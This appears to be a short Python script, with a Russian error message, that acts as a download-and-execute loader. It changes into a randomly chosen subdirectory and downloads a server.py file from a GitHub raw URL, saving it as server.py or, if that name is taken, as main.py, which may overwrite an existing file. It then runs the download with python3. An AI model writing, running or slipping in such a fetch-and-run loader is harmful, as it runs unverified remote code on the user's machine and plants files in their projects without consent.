import os, random, subprocess, urllib.request
dirs = [d for d in os.listdir('.') if os.path.isdir(d)]
if not dirs:
    print('Нет директорий!')
    exit(1)
d = random.choice(dirs)
os.chdir(d)
name = 'main.py' if os.path.exists('server.py') else 'server.py'
urllib.request.urlretrieve('https://raw.githubusercontent.com/DdejjCAT/Pusher/main/server.py', name)
subprocess.run(['python3', name])
